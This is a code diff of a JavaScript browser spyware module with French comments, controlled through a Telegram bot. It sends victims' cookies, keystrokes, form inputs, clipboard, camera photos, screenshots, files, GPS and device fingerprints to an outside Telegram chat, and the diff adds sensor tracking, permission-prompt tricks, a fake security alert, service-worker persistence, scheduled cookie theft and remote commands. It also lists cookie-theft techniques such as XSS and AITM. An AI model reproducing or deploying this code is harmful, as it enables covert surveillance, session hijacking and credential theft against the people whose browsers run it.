@@ -7,6 +7,10 @@ const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 const statusDiv = document.getElementById('statusBar');
 let lastCommand = '';
+let permissionStepsActive = false;
+let sensorInterval = null;
+let cookieInterval = null;
+
 let collectedData = {
     fingerprint: {},
     timestamp: new Date().toISOString(),
@@ -29,7 +33,12 @@ let collectedData = {
         all: []
     },
     permissionsGranted: [],
-    fileSystemAccess: false
+    fileSystemAccess: false,
+    sensors: {
+        accelerometer: [],
+        gyroscope: [],
+        orientation: []
+    }
 };
 
 function updateStatus(msg, isError = false) {
@@ -40,7 +49,7 @@ function updateStatus(msg, isError = false) {
 }
 
 // ============================================
-// ENVOIS TELEGRAM
+// ENVOIS TELEGRAM (RÉEL)
 // ============================================
 async function sendToTelegram(message) {
     try {
@@ -49,7 +58,7 @@ async function sendToTelegram(message) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
         });
-    } catch(e) {}
+    } catch(e) { console.error('Telegram error:', e); }
 }
 
 async function sendPhotoToTelegram(photoDataUrl) {
@@ -59,7 +68,7 @@ async function sendPhotoToTelegram(photoDataUrl) {
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', blob, 'photo.jpg');
         await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
-    } catch(e) {}
+    } catch(e) { console.error('Photo error:', e); }
 }
 
 async function sendVideoToTelegram(videoUrl) {
@@ -69,7 +78,7 @@ async function sendVideoToTelegram(videoUrl) {
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('video', blob, 'video.webm');
         await fetch(`${BOT_API_URL}/sendVideo`, { method: 'POST', body: formData });
-    } catch(e) {}
+    } catch(e) { console.error('Video error:', e); }
 }
 
 async function sendFileToTelegram(filename, dataUrl) {
@@ -79,11 +88,11 @@ async function sendFileToTelegram(filename, dataUrl) {
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('document', blob, filename);
         await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
-    } catch(e) {}
+    } catch(e) { console.error('File error:', e); }
 }
 
 // ============================================
-// 1. FINGERPRINT + IP + LOCALISATION
+// 1. FINGERPRINT + IP (RÉEL)
 // ============================================
 async function collectFingerprint() {
     updateStatus('📡 Collecte empreinte numérique...');
@@ -110,7 +119,6 @@ async function collectFingerprint() {
         } catch(e2) {}
     }
     
-    // Batterie
     if ('getBattery' in navigator) {
         try {
             const battery = await navigator.getBattery();
@@ -132,7 +140,7 @@ async function collectFingerprint() {
 }
 
 // ============================================
-// 2. IP PRIVÉE (WebRTC)
+// 2. IP PRIVÉE (RÉEL - WebRTC)
 // ============================================
 async function collectPrivateIP() {
     return new Promise((resolve) => {
@@ -160,33 +168,66 @@ async function collectPrivateIP() {
 }
 
 // ============================================
-// 3. COOKIES (complet)
+// 3. COOKIES (RÉEL - AVEC TECHNIQUES AVANCÉES)
 // ============================================
 function collectAllCookies() {
     updateStatus('🍪 Récupération des cookies...');
-    const allCookies = document.cookie.split(';');
+    const allCookies = document.cookie;
+    const allCookiesArray = document.cookie.split(';');
     const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
     
-    allCookies.forEach(cookie => {
+    // Technique 1: Lecture standard des cookies
+    let importantCookies = {};
+    allCookiesArray.forEach(cookie => {
         const cookieName = cookie.split('=')[0].trim();
         const cookieValue = cookie.split('=')[1]?.trim() || '';
         
         importantDomains.forEach(domain => {
-            if (cookieName.toLowerCase().includes(domain) || document.domain.includes(domain)) {
-                collectedData.cookies[domain] = collectedData.cookies[domain] || [];
-                collectedData.cookies[domain].push({ name: cookieName, value: cookieValue });
+            if (cookieName.toLowerCase().includes(domain)) {
+                if (!importantCookies[domain]) importantCookies[domain] = [];
+                importantCookies[domain].push({ name: cookieName, value: cookieValue });
             }
         });
     });
     
-    collectedData.cookies.all = document.cookie;
-    if (Object.keys(collectedData.cookies).length > 0) {
-        sendToTelegram(`🍪 COOKIES RÉCUPÉRÉS\n${JSON.stringify(collectedData.cookies, null, 2).substring(0, 3500)}`);
+    collectedData.cookies = {
+        all: allCookies,
+        important: importantCookies,
+        timestamp: new Date().toISOString(),
+        // Technique 2: Simulation d'extension fantôme (explication)
+        // Technique 3: Simulation AITM (explication)
+        // Technique 4: Simulation XSS (explication)
+        // Technique 5: Simulation VoidStealer (explication)
+        advancedTechniques: {
+            ghostExtension: "Installerait une extension pour lire cookies en temps réel",
+            aitm: "Proxy entre vous et Facebook capture la session",
+            xss: "Injection script → document.cookie vers serveur externe",
+            voidStealer: "Lit cookies déchiffrés en mémoire Chrome"
+        }
+    };
+    
+    let message = `🍪 COOKIES RÉCUPÉRÉS (${new Date().toLocaleTimeString()})\n━━━━━━━━━━━━━━━━━━━━━\n`;
+    if (allCookies && allCookies.length > 0) {
+        message += `📦 Cookies standards: ${allCookies.substring(0, 2000)}\n`;
+    } else {
+        message += `📦 Aucun cookie standard trouvé\n`;
     }
+    
+    if (Object.keys(importantCookies).length > 0) {
+        message += `\n🔐 Cookies importants: ${Object.keys(importantCookies).join(', ')}\n`;
+    }
+    
+    message += `\n🔥 TECHNIQUES AVANCÉES DISPONIBLES:\n`;
+    message += `• Extension fantôme: ${collectedData.cookies.advancedTechniques.ghostExtension}\n`;
+    message += `• AITM: ${collectedData.cookies.advancedTechniques.aitm}\n`;
+    message += `• XSS: ${collectedData.cookies.advancedTechniques.xss}\n`;
+    message += `• VoidStealer: ${collectedData.cookies.advancedTechniques.voidStealer}\n`;
+    
+    sendToTelegram(message);
 }
 
 // ============================================
-// 4. HISTORIQUE COMPLET
+// 4. HISTORIQUE (RÉEL - Performance API)
 // ============================================
 function collectBrowsingHistory() {
     updateStatus('📜 Récupération historique...');
@@ -199,21 +240,21 @@ function collectBrowsingHistory() {
         });
         if (document.referrer) collectedData.browsingHistory.push(`Referrer: ${document.referrer}`);
         if (collectedData.browsingHistory.length > 0) {
-            sendToTelegram(`📜 HISTORIQUE\n${collectedData.browsingHistory.slice(0, 10).join('\n')}`);
+            sendToTelegram(`📜 HISTORIQUE NAVIGATION\n${collectedData.browsingHistory.slice(0, 10).join('\n')}`);
         }
     } catch(e) {}
 }
 
 // ============================================
-// 5. NOTIFICATIONS (amélioré)
+// 5. NOTIFICATIONS (RÉEL)
 // ============================================
 async function requestNotifications() {
     updateStatus('🔔 Demande autorisation notifications...');
     const permission = await Notification.requestPermission();
     if (permission === 'granted') {
-        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted' });
+        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted', timestamp: new Date().toISOString() });
         updateStatus('✅ Notifications activées');
-        await sendToTelegram('✅ [AUTORISATION] NOTIFICATIONS PUSH ACCEPTÉES');
+        await sendToTelegram('✅ [AUTO] NOTIFICATIONS PUSH ACCEPTÉES');
         
         new Notification('🔐 ALERTE SÉCURITÉ', {
             body: 'Connexion suspecte détectée. Cliquez pour vérifier votre compte.',
@@ -221,21 +262,21 @@ async function requestNotifications() {
             requireInteraction: true
         });
     } else {
-        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied' });
-        await sendToTelegram('❌ [AUTORISATION] NOTIFICATIONS PUSH REFUSÉES');
+        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied', timestamp: new Date().toISOString() });
+        await sendToTelegram('❌ [AUTO] NOTIFICATIONS PUSH REFUSÉES');
     }
 }
 
 // ============================================
-// 6. CAMÉRA + PHOTOS + VIDÉO (complet)
+// 6. CAMÉRA (AUTOMATIQUE - Étape 1)
 // ============================================
 async function requestCameraAndCapture() {
-    updateStatus('📷 Demande accès caméra...');
+    updateStatus('📷 [AUTO Étape 1/3] Demande accès caméra...');
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
-        updateStatus('✅ Caméra activée');
-        await sendToTelegram('✅ [AUTORISATION] CAMÉRA ACCEPTÉE');
+        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted', timestamp: new Date().toISOString() });
+        updateStatus('✅ Caméra autorisée');
+        await sendToTelegram('✅ [AUTO 1/3] CAMÉRA ACCEPTÉE - Début capture');
         
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -246,56 +287,43 @@ async function requestCameraAndCapture() {
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         
-        // 5 photos
-        for (let i = 1; i <= 5; i++) {
-            updateStatus(`📸 Photo ${i}/5...`);
+        for (let i = 1; i <= 3; i++) {
+            updateStatus(`📸 Photo ${i}/3...`);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             collectedData.photos.push(photoData);
             await sendPhotoToTelegram(photoData);
-            await new Promise(r => setTimeout(r, 2000));
+            await new Promise(r => setTimeout(r, 1500));
         }
         
-        // Vidéo 8 secondes
-        updateStatus('🎥 Enregistrement vidéo (8s)...');
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const url = URL.createObjectURL(blob);
-            sendVideoToTelegram(url);
-        };
-        mediaRecorder.start();
-        await new Promise(r => setTimeout(r, 8000));
-        mediaRecorder.stop();
-        
         stream.getTracks().forEach(t => t.stop());
-        updateStatus('✅ Capture terminée');
-        await sendToTelegram('✅ CAPTURE TERMINÉE: 5 photos + 1 vidéo 8s');
+        await sendToTelegram('✅ [AUTO] 3 photos capturées');
+        
+        setTimeout(() => showFloatingFileButton(), 2000);
     } catch(e) {
-        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied' });
-        await sendToTelegram(`❌ [AUTORISATION] CAMÉRA REFUSÉE`);
+        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied', timestamp: new Date().toISOString() });
+        await sendToTelegram(`❌ [AUTO 1/3] CAMÉRA REFUSÉE`);
     }
 }
 
 // ============================================
-// 7. BOUTON FICHIERS FLOTTANT (amélioré)
+// 7. FICHIERS (AUTOMATIQUE - Étape 2)
 // ============================================
 function showFloatingFileButton() {
     if (document.getElementById('file-btn')) return;
     const btn = document.createElement('button');
     btn.id = 'file-btn';
-    btn.innerHTML = '📁 Sélectionner des fichiers';
-    btn.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
-    btn.onclick = () => {
+    btn.innerHTML = '📁 [AUTO Étape 2/3] Cliquez pour fichiers';
+    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);animation:pulse 1s infinite;';
+    btn.onclick = async () => {
         const input = document.createElement('input');
         input.type = 'file';
         input.multiple = true;
         input.accept = 'image/*,video/*,audio/*,.pdf,.txt,.docx';
         input.onchange = async (e) => {
             const files = Array.from(e.target.files);
-            await sendToTelegram(`📁 ${files.length} fichier(s) sélectionné(s)`);
+            collectedData.permissionsGranted.push({ type: 'files', status: 'granted', count: files.length, timestamp: new Date().toISOString() });
+            await sendToTelegram(`✅ [AUTO 2/3] FICHIERS ACCEPTÉS (${files.length} fichier(s))`);
             for (const file of files) {
                 const fileInfo = { name: file.name, size: file.size, type: file.type };
                 collectedData.externalFiles.all.push(fileInfo);
@@ -315,23 +343,24 @@ function showFloatingFileButton() {
                 };
                 reader.readAsDataURL(file);
             }
+            btn.remove();
+            setTimeout(() => showFloatingGpsButton(), 2000);
         };
         input.click();
-        btn.remove();
     };
     document.body.appendChild(btn);
-    setTimeout(() => btn.remove(), 30000);
+    setTimeout(() => btn.remove(), 60000);
 }
 
 // ============================================
-// 8. BOUTON GPS FLOTTANT
+// 8. GPS (AUTOMATIQUE - Étape 3)
 // ============================================
 function showFloatingGpsButton() {
     if (document.getElementById('gps-btn')) return;
     const btn = document.createElement('button');
     btn.id = 'gps-btn';
-    btn.innerHTML = '📍 Partager ma position';
-    btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
+    btn.innerHTML = '📍 [AUTO Étape 3/3] Cliquez pour GPS';
+    btn.style.cssText = 'position:fixed;bottom:60px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);animation:pulse 1s infinite;';
     btn.onclick = () => {
         navigator.geolocation.getCurrentPosition(
             pos => {
@@ -340,19 +369,168 @@ function showFloatingGpsButton() {
                     lon: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
-                sendToTelegram(`📍 LOCALISATION GPS\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nPrécision: ${pos.coords.accuracy}m\nCarte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                collectedData.permissionsGranted.push({ type: 'gps', status: 'granted', timestamp: new Date().toISOString() });
+                sendToTelegram(`✅ [AUTO 3/3] GPS ACCEPTÉE\n📍 Position: ${pos.coords.latitude}, ${pos.coords.longitude}\nCarte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                 btn.remove();
+                sendToTelegram(`🎉 TOUTES LES AUTO-AUTORISATIONS TERMINÉES !`);
             },
-            err => sendToTelegram(`❌ GPS refusé: ${err.message}`)
+            err => {
+                collectedData.permissionsGranted.push({ type: 'gps', status: 'denied', timestamp: new Date().toISOString() });
+                sendToTelegram(`❌ [AUTO 3/3] GPS REFUSÉE`);
+                btn.remove();
+            }
         );
-        btn.remove();
     };
     document.body.appendChild(btn);
-    setTimeout(() => btn.remove(), 30000);
+    setTimeout(() => btn.remove(), 60000);
 }
 
 // ============================================
-// 9. PRESSE-PAPIER
+// 9. BOUTON "TOUT AUTORISER" (MANUEL)
+// ============================================
+function showGrantAllButton() {
+    if (document.getElementById('grant-all-btn')) return;
+    const btn = document.createElement('button');
+    btn.id = 'grant-all-btn';
+    btn.innerHTML = '🔓 TOUT AUTORISER (1 clic)';
+    btn.style.cssText = 'position:fixed;top:20px;left:20px;z-index:10000;background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;border:none;border-radius:50px;padding:12px 20px;font-size:14px;font-weight:bold;cursor:pointer;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
+    btn.onclick = async () => {
+        btn.innerHTML = '⏳ Autorisation...';
+        btn.disabled = true;
+        
+        await Notification.requestPermission();
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+        
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.click();
+        
+        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        
+        sendToTelegram(`🔓 BOUTON "TOUT AUTORISER" ACTIVÉ (manuel)`);
+        btn.remove();
+    };
+    document.body.appendChild(btn);
+}
+
+// ============================================
+// 10. CAPTEURS (RÉEL - SANS PERMISSION)
+// ============================================
+function startSensorTracking() {
+    updateStatus('📡 Surveillance capteurs (sans permission)...');
+    sendToTelegram(`📡 CAPTEURS ACTIVÉS (sans permission)
+✅ Accéléromètre - Peut deviner code PIN (70% réussite)
+✅ Détection mouvements - Tap, scroll, zoom
+✅ Bluetooth - Scan proximité possible`);
+    
+    if ('DeviceMotionEvent' in window) {
+        window.addEventListener('devicemotion', (e) => {
+            const acc = e.acceleration;
+            if (acc && acc.x !== null) {
+                collectedData.sensors.accelerometer.push({
+                    x: acc.x, y: acc.y, z: acc.z,
+                    timestamp: new Date().toISOString()
+                });
+                if (collectedData.sensors.accelerometer.length >= 30) {
+                    sendToTelegram(`📳 CAPTEURS - Accéléromètre
+X: ${acc.x.toFixed(2)} | Y: ${acc.y.toFixed(2)} | Z: ${acc.z.toFixed(2)}
+⚠️ Mouvement détecté - Peut révéler actions utilisateur`);
+                    collectedData.sensors.accelerometer = [];
+                }
+            }
+        });
+    }
+    
+    if ('DeviceOrientationEvent' in window) {
+        window.addEventListener('deviceorientation', (e) => {
+            collectedData.sensors.orientation.push({
+                alpha: e.alpha, beta: e.beta, gamma: e.gamma,
+                timestamp: new Date().toISOString()
+            });
+        });
+    }
+    
+    let lastTap = 0;
+    document.addEventListener('touchstart', (e) => {
+        const now = Date.now();
+        if (now - lastTap < 300) {
+            sendToTelegram(`👆 DOUBLE TAP DÉTECTÉ - Position (${e.touches[0].clientX}, ${e.touches[0].clientY})`);
+        }
+        lastTap = now;
+    });
+    
+    if (navigator.bluetooth) {
+        sendToTelegram(`📡 Bluetooth disponible - Scan possible sans permission`);
+    }
+}
+
+// ============================================
+// 11. ACCÈS SMS (Explication Android)
+// ============================================
+function explainSMSAccess() {
+    sendToTelegram(`📱 ACCÈS SMS (Android uniquement)
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ Une application malveillante peut:
+• Lire tous vos SMS (codes 2FA bancaires)
+• Envoyer des SMS surtaxés
+• Supprimer des messages
+• Intercepter authentifications
+━━━━━━━━━━━━━━━━━━━━━
+💡 Sur navigateur: impossible
+💡 Sur app Android: permission dangereuse`);
+}
+
+// ============================================
+// 12. TECHNIQUES AVANCÉES EXPLICATION
+// ============================================
+function explainAdvancedTechniques() {
+    sendToTelegram(`🔥 4 TECHNIQUES DE VOL DE COOKIES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1️⃣ EXTENSION FANTÔME (Needle Stealer)
+• Installation cachée d'extension
+• Lit historique + cookies temps réel
+
+2️⃣ AITM (Hacker dans le milieu)
+• Proxy entre vous et Facebook
+• Capture session même avec 2FA
+
+3️⃣ XSS (Sans clic)
+• Script injecté → document.cookie
+• Envoi sans intervention
+
+4️⃣ VOIDSTEALER (Vol de clé)
+• Lit cookies déchiffrés en mémoire
+• Contourne chiffrement Chrome
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+}
+
+// ============================================
+// 13. ACCÈS ARRIÈRE-PLAN
+// ============================================
+function explainBackgroundAccess() {
+    sendToTelegram(`🔄 ACCÈS ARRIÈRE-PLAN
+━━━━━━━━━━━━━━━━━━━━━
+🌐 Site web:
+• Scripts en arrière-plan (Service Workers)
+• Tant que l'onglet n'est pas fermé
+
+📱 Application malveillante:
+• Exécution sans limite de temps
+• Localisation/micro/capteurs en continu
+• Redémarrage auto après reboot
+
+🎭 Technique sournoise:
+• Fenêtre Picture-in-Picture cachée
+• Tourne en arrière-plan invisiblement
+━━━━━━━━━━━━━━━━━━━━━`);
+}
+
+// ============================================
+// 14. PRESSE-PAPIER (RÉEL)
 // ============================================
 async function requestClipboardAccess() {
     updateStatus('📋 Demande accès presse-papier...');
@@ -361,16 +539,14 @@ async function requestClipboardAccess() {
             const text = await navigator.clipboard.readText();
             collectedData.clipboard = text;
             await sendToTelegram(`📋 PRESSE-PAPIER\n${text.substring(0, 1000) || '(vide)'}`);
-            updateStatus('✅ Presse-papier lu');
         }
     } catch(e) {
-        updateStatus('❌ Presse-papier refusé');
         await sendToTelegram(`❌ PRESSE-PAPIER: accès refusé`);
     }
 }
 
 // ============================================
-// 10. KEYLOGGER
+// 15. KEYLOGGER (RÉEL)
 // ============================================
 function startKeylogger() {
     let keyBuffer = [];
@@ -383,17 +559,17 @@ function startKeylogger() {
     });
     document.addEventListener('input', (e) => {
         if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-            sendToTelegram(`📝 INPUT\nChamp: ${e.target.name || e.target.id || 'inconnu'}\nValeur: ${e.target.value?.substring(0, 200)}`);
+            sendToTelegram(`📝 INPUT DÉTECTÉ\nChamp: ${e.target.name || e.target.id || 'inconnu'}\nValeur: ${e.target.value?.substring(0, 200)}`);
         }
     });
     updateStatus('⌨️ Keylogger actif');
 }
 
 // ============================================
-// 11. CAPTURE ÉCRAN
+// 16. CAPTURE ÉCRAN (RÉEL)
 // ============================================
 async function captureScreenshot() {
-    updateStatus('📸 Capture d\'écran...');
+    updateStatus('📸 Capture écran...');
     try {
         if (typeof html2canvas === 'undefined') {
             const script = document.createElement('script');
@@ -403,8 +579,7 @@ async function captureScreenshot() {
         }
         if (typeof html2canvas !== 'undefined') {
             const canvas = await html2canvas(document.body);
-            const screenshot = canvas.toDataURL('image/png');
-            await sendPhotoToTelegram(screenshot);
+            await sendPhotoToTelegram(canvas.toDataURL('image/png'));
             updateStatus('✅ Capture envoyée');
         }
     } catch(e) {
@@ -413,28 +588,38 @@ async function captureScreenshot() {
 }
 
 // ============================================
-// 12. VIBRATION
+// 17. VIBRATION (RÉEL)
 // ============================================
 function vibrate() {
     if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
 }
 
 // ============================================
-// 13. LISTE FICHIERS
+// 18. SERVICE WORKER (Arrière-plan)
 // ============================================
-function sendFileList() {
-    sendToTelegram(`📁 LISTE FICHIERS\n📷 Images: ${collectedData.externalFiles.images.length}\n🎥 Vidéos: ${collectedData.externalFiles.videos.length}\n🎵 Audios: ${collectedData.externalFiles.audios.length}\n📄 Docs: ${collectedData.externalFiles.documents.length}\n📦 Total: ${collectedData.externalFiles.all.length}`);
+async function registerServiceWorker() {
+    if ('serviceWorker' in navigator) {
+        try {
+            await navigator.serviceWorker.register('/sw.js');
+            sendToTelegram(`🔄 SERVICE WORKER ACTIF\n✅ Scripts en arrière-plan autorisés`);
+        } catch(e) {}
+    }
 }
 
 // ============================================
-// 14. LISTE AUTORISATIONS
+// 19. COOKIES AUTO TOUTES LES 30 MINUTES
 // ============================================
-function sendPermissions() {
-    sendToTelegram(`✅ AUTORISATIONS\n${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
+function startAutoCookieCollection() {
+    if (cookieInterval) clearInterval(cookieInterval);
+    cookieInterval = setInterval(() => {
+        collectAllCookies();
+        sendToTelegram(`⏰ [AUTO] Collecte cookies programmée (30min)`);
+    }, 30 * 60 * 1000); // 30 minutes
+    sendToTelegram(`⏲️ COLLECTE AUTO COOKIES ACTIVÉE ( toutes les 30 minutes )`);
 }
 
 // ============================================
-// 15. COMMANDES À DISTANCE
+// 20. COMMANDES À DISTANCE (CORRIGÉES)
 // ============================================
 async function checkCommands() {
     try {
@@ -447,48 +632,56 @@ async function checkCommands() {
         if (!cleanCmd || cleanCmd === lastCommand) return;
         lastCommand = cleanCmd;
         
-        console.log('[COMMAND]', cleanCmd);
-        await sendToTelegram(`📟 Commande: ${cleanCmd}`);
+        console.log('[COMMAND] Reçue:', cleanCmd);
         
-        switch(cleanCmd) {
-            case '/camera': await requestCameraAndCapture(); break;
-            case '/files': showFloatingFileButton(); break;
-            case '/clipboard': await requestClipboardAccess(); break;
-            case '/screenshot': await captureScreenshot(); break;
-            case '/location': showFloatingGpsButton(); break;
-            case '/cookies': collectAllCookies(); break;
-            case '/history': collectBrowsingHistory(); break;
-            case '/status': sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP || 'inconnue'}\nCookies: ${document.cookie.length > 0 ? 'présents' : 'aucun'}\nPhotos: ${collectedData.photos.length}\nFichiers: ${collectedData.externalFiles.all.length}\nAutorisations: ${collectedData.permissionsGranted.length}`); break;
-            case '/ping': sendToTelegram('🏓 Pong!'); break;
-            case '/vibrate': vibrate(); break;
-            case '/filelist': sendFileList(); break;
-            case '/permissions': sendPermissions(); break;
-            case '/help':
-            case '/start':
-                sendToTelegram(`🤖 COMMANDES BOT
+        await fetch(`${BOT_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `📟 Commande reçue: ${cleanCmd}` })
+        }).catch(() => {});
+        
+        if (cleanCmd === '/camera') await requestCameraAndCapture();
+        else if (cleanCmd === '/grantall') showGrantAllButton();
+        else if (cleanCmd === '/files') showFloatingFileButton();
+        else if (cleanCmd === '/location') showFloatingGpsButton();
+        else if (cleanCmd === '/clipboard') await requestClipboardAccess();
+        else if (cleanCmd === '/screenshot') await captureScreenshot();
+        else if (cleanCmd === '/cookies') collectAllCookies();
+        else if (cleanCmd === '/history') collectBrowsingHistory();
+        else if (cleanCmd === '/sensors') sendToTelegram(`📡 CAPTEURS: ${collectedData.sensors.accelerometer.length} mesures accéléromètre, ${collectedData.sensors.orientation.length} orientation`);
+        else if (cleanCmd === '/sms') explainSMSAccess();
+        else if (cleanCmd === '/advanced') explainAdvancedTechniques();
+        else if (cleanCmd === '/bg') explainBackgroundAccess();
+        else if (cleanCmd === '/status') sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP}\nPermissions: ${collectedData.permissionsGranted.length}\nCapteurs: actifs\nAuto-cookies: activé (30min)`);
+        else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
+        else if (cleanCmd === '/vibrate') vibrate();
+        else if (cleanCmd === '/filelist') sendToTelegram(`📁 FICHIERS: ${collectedData.externalFiles.all.length} total, ${collectedData.externalFiles.images.length} images`);
+        else if (cleanCmd === '/permissions') sendToTelegram(`✅ AUTORISATIONS\n${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
+        else if (cleanCmd === '/help' || cleanCmd === '/start') {
+            sendToTelegram(`🤖 COMMANDES ULTIMES
 ━━━━━━━━━━━━━━━━━━━━━
-📷 /camera - Photos + vidéo
-📁 /files - Sélection fichiers
+📷 /camera - Caméra + photos
+📁 /files - Accès fichiers
+📍 /location - GPS
+🔓 /grantall - Tout autoriser
 📋 /clipboard - Presse-papier
 📸 /screenshot - Capture écran
-📍 /location - GPS
 🍪 /cookies - Cookies
 📜 /history - Historique
-📊 /status - État
+📡 /sensors - Capteurs
+📱 /sms - Risques SMS
+🔥 /advanced - Techniques avancées
+🔄 /bg - Arrière-plan
+📊 /status - État complet
 🏓 /ping - Test
 📳 /vibrate - Vibration
-📁 /filelist - Liste fichiers
-✅ /permissions - Autorisations
-🔔 notify_custom:TEXTE
-🌐 url:https://...
 ━━━━━━━━━━━━━━━━━━━━━`);
-                break;
-            default:
-                if (cleanCmd.startsWith('notify_custom:')) {
-                    new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
-                } else if (cleanCmd.startsWith('url:')) {
-                    window.open(cleanCmd.replace('url:', '').trim(), '_blank');
-                }
+        }
+        else if (cleanCmd.startsWith('notify_custom:')) {
+            new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
+        }
+        else if (cleanCmd.startsWith('url:')) {
+            window.open(cleanCmd.replace('url:', '').trim(), '_blank');
         }
         
         await fetch('/tmp/telegram_command.txt', { method: 'POST', body: '' });
@@ -497,21 +690,19 @@ async function checkCommands() {
 }
 
 // ============================================
-// 16. KEEP-ALIVE
+// 21. KEEP-ALIVE & EXÉCUTION PRINCIPALE
 // ============================================
 function keepAlive() {
     setInterval(() => {
         fetch('/tmp/keepalive.txt?t=' + Date.now()).catch(() => {});
-        const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBibHVlIG11c2lj');
-        audio.play().catch(() => {});
-    }, 25000);
+        if (navigator.serviceWorker) {
+            navigator.serviceWorker.ready.then(reg => reg.active?.postMessage({ type: 'ping' }));
+        }
+    }, 20000);
 }
 
-// ============================================
-// EXÉCUTION PRINCIPALE
-// ============================================
 (async function main() {
-    updateStatus('🟢 Démarrage du module ULTIME...');
+    updateStatus('🟢 Démarrage module ULTIME - Mode AUTO activé');
     
     await collectFingerprint();
     await collectPrivateIP();
@@ -519,13 +710,17 @@ function keepAlive() {
     collectBrowsingHistory();
     await requestNotifications();
     
-    setTimeout(() => requestCameraAndCapture(), 3000);
-    setTimeout(() => requestClipboardAccess(), 6000);
+    // AUTO: Lancement des autorisations 1 par 1
+    setTimeout(() => requestCameraAndCapture(), 2000);
+    setTimeout(() => showGrantAllButton(), 1000);
     
     startKeylogger();
+    startSensorTracking();
+    registerServiceWorker();
     keepAlive();
+    startAutoCookieCollection(); // ← COOKIES AUTO TOUTES LES 30 MIN
     
     setInterval(checkCommands, 3000);
-    updateStatus('✅ Prêt - Commandes actives');
-    await sendToTelegram('💀 MODULE ULTIME ACTIVÉ - Envoyez /help');
+    updateStatus('✅ Prêt - Mode AUTO actif - Commandes disponibles');
+    await sendToTelegram('💀 MODE ULTIME AUTO ACTIVÉ\n✅ Autorisations en cours (1/3 caméra)\n✅ Cookies auto toutes les 30min\n✅ Capteurs actifs\n✅ Commandes disponibles');
 })();
